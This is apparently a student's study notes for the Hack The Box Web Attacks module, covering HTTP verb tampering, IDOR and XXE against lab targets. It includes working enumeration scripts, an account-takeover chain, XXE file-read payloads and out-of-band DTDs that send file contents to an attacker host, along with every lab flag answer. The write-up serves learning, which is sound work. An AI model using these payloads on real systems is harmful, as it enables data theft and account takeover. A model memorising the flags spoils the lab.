# Web Attacks (HTB Supplementary)

#WebAttacks #HTTPVerbTampering #IDOR #XXE #InsecureDirectObjectReference #XMLExternalEntity #OWASP #HTBSupplementary

**HTB Web Attacks module**, covers three attack classes not deeply covered in the Offsec web modules:
1. **HTTP Verb Tampering**, bypassing auth and filters by switching HTTP method
2. **IDOR**. Insecure Direct Object Reference, enumerating and chaining API/object access
3. **XXE**. XML External Entity injection, reading local files and exfiltrating data out-of-band

Already in vault: basic web enumeration, XSS, file inclusion/LFI, file upload attacks, command injection, SQLi. See [[Introduction to Web Application Attacks]], [[Common Web Application Attacks]].

> 🔁 Cross-refs: [[Web Applications#Burp Suite|Burp Suite appendix]], [[File Inclusion (HTB Supplementary)#FI.7. PHP Filters|php://filter]], [[File Upload Attacks (HTB Supplementary)#FUA.6. Limited File Uploads|SVG XXE]]

---

## Outstanding Sections

- [x] WA.1. HTTP Verb Tampering. Basic Auth Bypass
- [x] WA.2. HTTP Verb Tampering. Security Filter Bypass
- [x] WA.3. IDOR. Mass Enumeration
- [x] WA.4. IDOR. Bypassing Encoded References
- [x] WA.5. IDOR. Insecure APIs
- [x] WA.6. IDOR. Chaining IDOR Vulnerabilities
- [x] WA.7. XXE. Local File Disclosure
- [x] WA.8. XXE. Advanced File Disclosure (CDATA + Error-based)
- [x] WA.9. XXE. Blind Data Exfiltration (OOB)
- [x] WA.10. Skills Assessment (IDOR + Verb Tamper + XXE chain)

---

## WA.1. HTTP Verb Tampering — Basic Auth Bypass

HTTP Basic Authentication is configured per-path and per-method in server config. A server may require auth for `GET /reset.php` but not have the rule applied to `OPTIONS` or `PATCH` on the same path. The fix requires the config to explicitly list every method, not just the "obvious" ones.

**Bypass workflow:**

1. Visit the target page, if it redirects to a basic auth prompt, note which specific path triggers it (e.g. `/reset.php`)
2. Intercept the triggering request in Burp
3. Change the request method from GET/POST to OPTIONS (or PATCH/HEAD/PUT)
4. Forward the modified request

The server handles the alternate-method request with no auth check applied. The action still executes.

```
# Burp Repeater: change the first line from
GET /reset.php HTTP/1.1
# to
OPTIONS /reset.php HTTP/1.1
```

> 🔍 Worth remembering generally: OPTIONS is the cleanest method to try first because it's defined in HTTP spec to describe available methods for a resource, and many servers whitelist it implicitly. PATCH/HEAD/PUT are second choices. Not all frameworks inherit auth rules across methods, the PHP `$_SERVER['REQUEST_METHOD']` check and Apache `.htaccess` `<Limit GET POST>` directives are the most common misconfigs that leave other verbs open.

**Q1 Answer:** `HTB{4lw4y5_c0v3r_4ll_v3rb5}`

#### Tags: #HTTPVerbTampering #BasicAuthBypass #OPTIONS

---

## WA.2. HTTP Verb Tampering — Security Filter Bypass

Security filters (command injection blacklists, SQL injection WAFs) sometimes only apply to one HTTP method. A POST filter may not check GET parameters at all. Switching methods bypasses the filter while still triggering the same backend functionality.

**Bypass workflow:**

1. Identify a form that has a security filter on POST (e.g. `file; cp /flag.txt ./` in a filename field gets rejected)
2. Intercept the POST request in Burp
3. Right-click → "Change request method". Burp rewrites the request to GET and moves POST body params to URL query string
4. Forward the modified request

The backend receives the same parameters via GET, and the filter (which only checks the POST body) never fires.

> 🔍 Worth remembering generally: the verb tamper trick for filters works because developers implement filters at the framework middleware level ("apply this filter to POST /action") rather than at the function level. If the endpoint handler just reads the param regardless of method (PHP's `$_REQUEST['param']` catches both GET and POST), swapping the verb evades the filter entirely.

**Q1 Answer:** `HTB{b3_v3rb_c0n51573n7}`

#### Tags: #HTTPVerbTampering #SecurityFilterBypass #MethodTamper

---

## WA.3. IDOR — Mass Enumeration

IDOR (Insecure Direct Object Reference) occurs when an app uses a user-supplied ID to look up a resource with no authorization check, if you can read your own record at `/documents.php?uid=1`, you can read anyone else's by incrementing the uid.

**Mass enumeration pattern — POST-based:**

```bash
#!/bin/bash

url="http://$1"

for i in {1..20}; do
    for link in $(curl -s -X POST "$url/documents.php" -d "uid=$i" | grep -oP "/documents.*?\.[a-z]{3}"); 
    do
        wget -q $url$link
    done
done

# Usage:
bash script.sh STMIP:STMPO
```

Pipeline breakdown:
- `curl -s -X POST ... -d "uid=$i"` — POST each uid
- `grep -oP "/documents.*?\.[a-z]{3}"` — extract `href` paths matching `/documents/<anything>.<ext>` from the HTML response
- `wget -q $url$link` — download each extracted file

After downloading, check sizes to find non-empty files:
```bash
ls -lAS document_* | head -5
cat flag_*.txt
```

> 🔧 Technique: the grep pattern `/documents.*?\.[a-z]{3}` matches any path starting with `/documents/` ending in a 3-char extension. Adjust for the actual URL path prefix and extension length the target uses. If the app returns JSON instead of HTML, swap grep for `jq '.[] | .link'` or similar.

**Q1 Answer:** `HTB{4ll_f1l35_4r3_m1n3}`

#### Tags: #IDOR #MassEnumeration #IDOREnumeration #BashScript

---

## WA.4. IDOR — Bypassing Encoded References

Some apps try to obscure direct object references by base64-encoding or MD5-hashing the uid before using it as a parameter. This doesn't prevent IDOR, it just requires reproducing the encoding client-side.

**Identifying the encoding:**

1. View the page source of the target page
2. Look for how `href` values or hidden form fields are generated: `/download.php?contract=<BASE64>` → the base64 decodes to just the uid integer

**Loop with base64 encoding:**

```bash
for i in {1..20}; do
    for hash in $(echo -n $i | base64 -w 0); do
        curl -sOJ "http://STMIP:STMPO/download.php?contract=$hash"
    done
done
```

`-O` saves with the server-provided filename, `-J` uses `Content-Disposition` header for the name. The `-w 0` flag disables line-wrapping in base64 output (important, a newline in the base64 breaks the URL).

After downloading, find the non-empty file:
```bash
ls -lAS contract_*
cat contract_<hash>.pdf   # even .pdf extension files can contain plaintext flags
```

> 🔍 Worth remembering generally: MD5 hashes of predictable sequential integers are just as vulnerable as the integers themselves, you generate the same hash client-side. `echo -n 5 | md5sum` gives the MD5 of the integer 5. The same loop pattern works, just swap `base64` for `md5sum | cut -d' ' -f1`.

**Q1 Answer:** `HTB{h45h1n6_1d5_w0n7_570p_m3}`

#### Tags: #IDOR #EncodedReferences #Base64Encoding #MD5Hash

---

## WA.5. IDOR — Insecure APIs

REST API endpoints that use a resource ID in the URL path are a very common IDOR location. The app may show your profile by calling `GET /api.php/profile/1` but nothing stops you from requesting `/api.php/profile/2`.

**Identifying the API call:**

1. Open browser DevTools → Network tab
2. Click "Edit Profile" or any action that loads user-specific data
3. Watch for a GET request to a path like `/profile/api.php/profile/<uid>`, the uid is your own account's ID

**Exploiting:**

In Burp Repeater, change the uid in the path to enumerate other users:
```
GET /profile/api.php/profile/5 HTTP/1.1
```

The response returns that user's full profile JSON, including their `uuid`.

**Q1 Answer:** `eb4fe264c10eb7a528b047aa983a4829`

#### Tags: #IDOR #InsecureAPI #RESTAPI #APIEnumeration

---

## WA.6. IDOR — Chaining IDOR Vulnerabilities

Individual IDOR findings often have limited impact alone (read-only profile data). Chaining multiple IDORs, read access then write access, escalates to account takeover or privilege escalation.

**Chain pattern — find admin, modify admin profile:**

```bash
#!/bin/bash

# Step 1: enumerate all uid values, find the admin
for uid in {1..10}; do
    curl -s "http://STMIP:STMPO/profile/api.php/profile/$uid"; echo
done | grep -i "admin" | jq .
```

Output gives the admin's uid, uuid, role, email, all needed for a PUT/POST modification.

**Step 2: intercept an "edit profile" action in Burp, modify it:**

Change the endpoint from your uid to the admin's uid, and replace the request body JSON with the admin's data (use their uuid, the server likely validates uuid matches uid to prevent arbitrary writes, but doesn't check the PHPSESSID against the uid in the request body):

```json
{
  "uid": "10",
  "uuid": "bfd92386a1b48076792e68b596846499",
  "role": "staff_admin",
  "full_name": "admin",
  "email": "flag@idor.htb",
  "about": "Never gonna give you up, Never gonna let you down"
}
```

The server writes the modified email. Reload the Edit Profile page, the flag appears because changing the admin email to the magic address triggers the flag display.

> 🔧 Technique: many APIs use uuid as a secondary auth check on write operations. "you can only update this record if you provide its uuid." This stops random writes but doesn't stop IDOR: since you can read the uuid via the GET endpoint (WA.5), you have everything needed to satisfy the write check.

**Q1 Answer:** `HTB{1_4m_4n_1d0r_m4573r}`

#### Tags: #IDOR #ChainingIDOR #AccountTakeover #APIPUT

---

## WA.7. XXE — Local File Disclosure

XXE (XML External Entity) injection occurs when an app parses XML input without disabling external entity resolution. If user-submitted XML reaches the XML parser and the parser fetches SYSTEM URIs, an attacker can read local files.

**Identifying XXE:**

- Look for forms that POST XML to the server (intercept in Burp, `Content-Type: application/xml` or `text/xml`, or a `<?xml` prefix in the body)
- Test: inject `<!DOCTYPE test [<!ENTITY xxe "HELLO">]>` and reference `&xxe;` somewhere that reflects in the response, if "HELLO" appears, entities are being processed

**Basic file read — `/etc/passwd`:**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>
    <email>&xxe;</email>
</root>
```

The `email` field reflects back in the response with the file content substituted.

**PHP source disclosure via `php://filter`:**

PHP files contain `<?php` tags which would break raw XML. Use the `php://filter` wrapper to base64-encode first:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=connection.php">]>
<root>
    <email>&xxe;</email>
</root>
```

The response contains a base64 blob. Decode it in Burp Inspector (double-click the blob in Repeater's response panel) or:

```bash
echo 'BASE64BLOB' | base64 -d
```

> 🔁 Similar to: [[File Inclusion (HTB Supplementary)#FI.7. PHP Filters|php://filter in LFI]], same wrapper, different injection point. Here it's in an XML entity; there it's in a URL parameter.

**Q1 Answer:** `UTM1NjM0MmRzJ2dmcTIzND0wMXJnZXdmc2RmCg`

#### Tags: #XXE #XMLExternalEntity #LocalFileDisclosure #PHPFilter #Base64

---

## WA.8. XXE — Advanced File Disclosure

**Problem with basic XXE for PHP files:** even with php://filter base64-encoding, some file content may contain characters that break XML parsing (`<`, `>`, `&`). The CDATA approach wraps the content in a CDATA section so the parser treats it as raw text, not XML.

### CDATA Method (for files with XML-breaking characters)

CDATA sections (`<![CDATA[ ... ]]>`) tell the XML parser to treat everything inside as plain text. The challenge: you can't concatenate CDATA markers and entity references in a single inline entity. Fix: use **XML Parameter Entities** in an external DTD.

**Step 1: Create the external DTD file (on your Kali box):**

```bash
echo '<!ENTITY joined "%begin;%file;%end;">' > XXE.dtd
```

**Step 2: Host it:**

```bash
python3 -m http.server 8000
```

**Step 3: Inject the payload** (reference the external DTD + the joined entity):

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY % begin "<![CDATA[">
  <!ENTITY % file SYSTEM "file:///flag.php">
  <!ENTITY % end "]]>">
  <!ENTITY % xxe SYSTEM "http://PWNIP:8000/XXE.dtd">
  %xxe;
]>
<root>
    <email>&joined;</email>
</root>
```

How it works:
- `%begin`, `%file`, `%end` are parameter entities (% prefix, only usable inside DOCTYPE)
- The external DTD combines them: `%begin;%file;%end;` → `<![CDATA[<file content>]]>`
- That assembled value becomes the regular entity `&joined;` which can appear in the XML body
- The parser wraps the file content in CDATA and treats it as plain text, not markup

Intercept the response in Burp (Proxy → Intercept response to this request before forwarding) to see the flag in the raw response body.

### Error-based Method (when the reflected field doesn't appear in the response)

Force a parse error that leaks the file content in the error message. The error message renders the "invalid" URI, which includes the file content.

**External DTD (error-trigger):**

```xml
<!ENTITY % file SYSTEM "file:///flag.php">
<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
```

```bash
cat > XXE.dtd << EOF
<!ENTITY % file SYSTEM "file:///flag.php">
<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
EOF
```

**Injection payload:**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
    <!ENTITY % remote SYSTEM "http://PWNIP:PWNPO/XXE.dtd">
    %remote;
    %error;
]>
```

The `%error;` entity tries to load `%nonExistingEntity;/%file;` as a URI. `%nonExistingEntity;` doesn't exist, so the parser throws an error, but the error message includes the attempted URI, which contains the literal content of `%file;` (the file contents). The file content appears in the XML parse error returned in the HTTP response.

> 🔍 Worth remembering generally: the error-based method works even when there's no reflected field in the response to carry the exfiltrated data. As long as error messages reach the HTTP response body (not just a generic 500), the parser's error output is the data channel.

**Q1 Answer:** `HTB{3rr0r5_c4n_l34k_d474}`

#### Tags: #XXE #CDATAMethod #ErrorBasedXXE #ParameterEntities #ExternalDTD

---

## WA.9. XXE — Blind Data Exfiltration (OOB)

When the server returns no output at all (blind XXE), neither in the response body nor in error messages, exfiltrate data out-of-band: make the server fetch a URL that includes the file content as a query parameter, captured in your HTTP server log.

**Use base64 to avoid URL-breaking characters in the file content.**

**Step 1: Create the OOB DTD file (on Kali):**

```bash
cat > XXE.dtd << EOF
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/path/to/file.php">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://PWNIP:PWNPO/?content=%file;'>">
EOF
```

- `%file` reads the target file via php://filter base64-encode (avoids URL-breaking chars in content)
- `%oob` builds an entity whose SYSTEM URI includes the base64 content as a query parameter
- When `%oob;` triggers, the server fetches `http://PWNIP/?content=BASE64BLOB` → appears in your HTTP server log

**Step 2: Host the DTD:**

```bash
python3 -m http.server 8000
```

**Step 3: Inject the blind XXE payload** (often needs to be sent as POST with XML body, possibly changing from GET):

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
    <!ENTITY % remote SYSTEM "http://PWNIP:8000/XXE.dtd">
    %remote;
    %oob;
]>
<root>
    &content;
</root>
```

**Step 4: Watch the HTTP server log:**

```
10.129.x.x - - [date] "GET /XXE.dtd HTTP/1.0" 200 -
10.129.x.x - - [date] "GET /?content=PD9waHAgJGZsYWcgPSAiSFRCezFf...K HTTP/1.0" 200 -
```

The `content=` query parameter holds the base64-encoded file. Decode it:

```bash
echo 'PD9waHAgJGZsYWcgPSAiSFRCezFf...' | base64 -d
```

> 🔧 Technique: the OOB approach works even when the endpoint's response is a generic success/fail (no reflection, no errors). Two HTTP connections appear on your server: one for the DTD fetch, one for the data exfil. If you see the DTD request but no data request, the `php://filter` resource path is wrong, or `%oob;` failed, try with `file:///` instead to rule out the filter step.

> 📸 Screenshot: HTTP server terminal showing two GET requests, `/XXE.dtd` then `/?content=BASE64BLOB`

**Q1 Answer:** `HTB{1_d0n7_n33d_0u7pu7_70_3xf1l7r473_d474}`

#### Tags: #XXE #BlindXXE #OOBExfiltration #OutOfBand #ExternalDTD

---

## WA.10. Skills Assessment

**Full chain: IDOR enumeration → IDOR token theft → HTTP verb tamper → login as admin → XXE**

**Credentials:** `htb-student:Academy_student!`

### Step 1: IDOR — Enumerate admin uid

Open browser DevTools (Network tab), log in, watch the requests. The profile page fires:
```
GET /api.php/user/74 HTTP/1.1
```
Response contains the current user's data. This API endpoint is IDOR-vulnerable, no auth check on the uid.

Script-fuzz uid 1-100 to find admin accounts:

```bash
#!/bin/bash
for uid in {1..100}; do
    curl -s "http://STMIP:STMPO/api.php/user/$uid"; echo
done | grep -i "admin" | jq .
```

Result: uid `52`, username `a.corrales`, company `Administrator`.

### Step 2: IDOR — Steal admin's password-reset token

When you initiate a password change via Settings, the app calls:
```
GET /api/token/74
```
and returns a user-specific reset token in the response.

Change `74` to `52` in Burp Repeater → get token for uid 52:
```
e51a85fa-17ac-11ec-8e51-e78234eb7b0c
```

### Step 3: HTTP Verb Tamper — bypass "Access Denied" on reset.php

Generate a strong password:
```bash
openssl rand -hex 16
# example: f0e18de14fdadfc38350d97ff7284a25
```

Attempt a POST to reset.php with `uid=52, token=..., password=...`:
```
POST /reset.php
uid=52&token=e51a85fa-17ac-11ec-8e51-e78234eb7b0c&password=f0e18de14fdadfc38350d97ff7284a25
```

Response: "Access Denied" (backend checks PHPSESSID session against the uid in POST body, they don't match because your session is uid 74).

Verb tamper: send as GET with params in the URL:
```
GET /reset.php?uid=52&token=e51a85fa-17ac-11ec-8e51-e78234eb7b0c&password=f0e18de14fdadfc38350d97ff7284a25
```

The GET-handling code doesn't apply the PHPSESSID check. Password reset succeeds.

### Step 4: Login as admin → find XXE injection point

Login as `a.corrales` with the new password. New "ADD EVENT" button appears. Click it, fill dummy data, intercept the POST in Burp, request body is XML:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<root>
    <name>test</name>
    <details>test</details>
    <date>2021-09-22</date>
</root>
```

### Step 5: XXE — Read /flag.php

Inject php://filter XXE into the `<name>` field (it reflects in the response):

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/flag.php"> ]>
<root>
    <name>&xxe;</name>
    <details>test</details>
    <date>2021-09-22</date>
</root>
```

Response contains the base64-encoded `/flag.php`. Decode:

```bash
echo 'PD9waHAgJGZsYWcgPSAiSFRCe200NTczcl93M2JfNDc3NGNrM3J9IjsgPz4K' | base64 -d
# <?php $flag = "HTB{m4573r_w3b_4774ck3r}"; ?>
```

### Attack Chain (Mermaid)

```mermaid
flowchart TD
    A[Login: htb-student:Academy_student!] --> B[DevTools: spot GET /api.php/user/74]
    B --> C[Script-fuzz uid 1-100\ngrep admin → uid 52, a.corrales]
    C --> D[IDOR: GET /api/token/52\n→ reset token for uid 52]
    D --> E[POST /reset.php uid=52 → Access Denied\nPHPSESSID mismatch]
    E --> F[Verb tamper: GET /reset.php?uid=52&token=...&password=...\n→ password reset succeeds]
    F --> G[Login as a.corrales with new password]
    G --> H[ADD EVENT form → XML body]
    H --> I[XXE: php://filter base64 /flag.php in name field]
    I --> J[Decode base64 → HTB{m4573r_w3b_4774ck3r}]
```

**Q1 Answer:** `HTB{m4573r_w3b_4774ck3r}`

#### Tags: #SkillsAssessment #IDORChain #VerbTampering #XXE #PrivilegeEscalation

---

## All Q&A Answers

| Section | Q# | Answer |
|---------|----|--------|
| Bypassing Basic Authentication | 1 | `HTB{4lw4y5_c0v3r_4ll_v3rb5}` |
| Bypassing Security Filters | 1 | `HTB{b3_v3rb_c0n51573n7}` |
| Mass IDOR Enumeration | 1 | `HTB{4ll_f1l35_4r3_m1n3}` |
| Bypassing Encoded References | 1 | `HTB{h45h1n6_1d5_w0n7_570p_m3}` |
| IDOR in Insecure APIs | 1 | `eb4fe264c10eb7a528b047aa983a4829` |
| Chaining IDOR Vulnerabilities | 1 | `HTB{1_4m_4n_1d0r_m4573r}` |
| Local File Disclosure | 1 | `UTM1NjM0MmRzJ2dmcTIzND0wMXJnZXdmc2RmCg` |
| Advanced File Disclosure | 1 | `HTB{3rr0r5_c4n_l34k_d474}` |
| Blind Data Exfiltration | 1 | `HTB{1_d0n7_n33d_0u7pu7_70_3xf1l7r473_d474}` |
| Skills Assessment | 1 | `HTB{m4573r_w3b_4774ck3r}` |

---

## External Resources

- [HackTricks. XXE Injection](https://github.com/HackTricks-wiki/hacktricks/blob/master/pentesting-web/xxe-xee-xml-external-entity.md)
- [HackTricks. IDOR](https://github.com/HackTricks-wiki/hacktricks/blob/master/pentesting-web/idor.md)
- [HackTricks. HTTP Verb Tampering](https://github.com/HackTricks-wiki/hacktricks/blob/master/pentesting-web/verb-tampering.md)
- [PayloadsAllTheThings. XXE Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection)
- [PayloadsAllTheThings. IDOR](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Insecure%20Direct%20Object%20References)

---

## Related Boxes

- **IDOR:** Very common in HTB web challenges and medium-rated machines with custom web apps. Public retired boxes rarely have standalone IDOR since they tend toward OS-level vectors, but web challenge categories on the HTB platform are full of it. Look for any box where an "Edit Profile" or "Documents" endpoint takes a user-controlled ID.
- **XXE:** HTB retired machines that use web app CVEs involving XML parsers (e.g. [Arkham](https://app.hackthebox.com/machines/Arkham) for Java deserialization, boxes with SOAP endpoints). The OOB technique specifically appears whenever an XXE is blind, common in Java/SAX parser apps.
- **HTTP Verb Tampering:** Appears in any box where the web app uses Apache/Nginx `Limit` directives for auth and the developer only listed `GET POST`. Rare in public retired boxes because it's a misconfiguration that's usually not the primary intended path.

---

## Module Summary

**HTTP Verb Tampering:** basic auth enforced per-method in server config? Switch from GET/POST to OPTIONS/PATCH/HEAD to bypass. Security filter applied only to POST? Switch to GET, params move to URL query string. Two-liner: intercept → "Change request method."

**IDOR:** any user-controlled ID in a URL/parameter/API path can be changed. Mass-enumerate with bash loop + curl. Encoded IDs (base64/MD5), reproduce the encoding client-side in a loop. API IDORs live in REST paths (`/api/profile/<uid>`). Chain read-IDOR (find uuid) + write-IDOR (modify profile using that uuid) for privilege escalation.

**XXE:** XML body with no entity-disabled parser = XXE. Inline entity for file read (`SYSTEM "file:///"`), php://filter base64 for PHP source. CDATA external DTD for files with XML-breaking chars. Error-based (`%nonExistingEntity;/%file;`) when there's no reflection. OOB blind (php://filter base64 → HTTP request to your server) when there's no output at all.


---

## HTB Module Quick Reference

Commands formatted for use with the [[Pre-Engagement Kali Setup]] variable block.

```bash
# ============================================================
# HTTP VERB TAMPERING
# ============================================================
# Check which methods the server accepts
curl -X OPTIONS http://$BoxIP:$WebPort/admin/ -i

# Bypass basic auth with PATCH (if server only checks GET/POST)
curl -X PATCH http://$BoxIP:$WebPort/admin/reset.php -i

# ============================================================
# IDOR — ENUMERATION
# ============================================================
# Mass-enumerate a numeric user ID parameter
for i in $(seq 1 100); do
  curl -s "http://$BoxIP:$WebPort/api/profile/$i" | grep -v "Access Denied"
done

# Reproduce base64-encoded IDOR reference client-side
echo -n "uid=1" | base64          # → encode what you think the reference is
# Then fuzz: swap the b64 value in the request

# MD5 hash an IDOR reference
echo -n "1" | md5sum

# ============================================================
# XXE — FILE READ
# ============================================================
# Basic inline entity — read /etc/passwd from XML body
# Replace the XML body's data field with:
# <?xml version="1.0"?>
# <!DOCTYPE email [
#   <!ENTITY xxe SYSTEM "file:///etc/passwd">
# ]>
# <root><email>&xxe;</email></root>

# php://filter — base64-encode PHP source to avoid XML-breaking chars
# <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">

# Error-based XXE (no reflection — triggers a PHP error with file content in the message)
# <!ENTITY % file SYSTEM "file:///etc/passwd">
# <!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">

# OOB blind exfiltration (when there's no output at all)
# <!ENTITY % oob "<!ENTITY content SYSTEM 'http://$LocalIP:8000/?content=%file;'>">
# Then listen: python3 -m http.server 8000

# CDATA external DTD (for files with XML-breaking chars like & < >)
# Host a .dtd file on your server with the CDATA wrapper, then:
# <!ENTITY % dtd SYSTEM "http://$LocalIP/custom.dtd">
# %dtd;

# ============================================================
# QUICK LISTENERS
# ============================================================
# HTTP callback listener for OOB XXE / blind XSS
python3 -m http.server 8000 -d .
sudo nc -lvnp 80
```
